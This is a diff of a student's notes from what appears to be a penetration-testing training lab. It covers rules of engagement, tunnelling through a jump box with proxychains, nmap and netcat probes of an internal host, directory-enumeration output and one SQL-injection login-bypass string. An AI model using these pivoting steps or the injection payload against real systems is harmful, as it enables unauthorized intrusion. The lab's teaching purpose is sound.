@@ -1,3 +1,9 @@
+All connections will be established through web browser to donovian-nla. 
+SSH masquerade to Donovian_Webserver with provide credentials. 
+Ports in use will be dependent on target location and are subject to change. 
+Web exploitation techniques are limited to SQLi injections. 
+Network scanning tools/technique usage is at the discretion of student.
+
 master socket to jump box
 
 dynamic tunnel 
@@ -10,4 +16,13 @@ proxychains nmap
 proxychains nc 10.100.28.48 80 http 
 proxychains nc 10.100.28.48 4444 ssh 
 
+RAM 'OR 1 ='1
+
 proxychains nmap --script=http-enum.nse 10.100.28.48
+80/tcp   open  http
+| http-enum: 
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
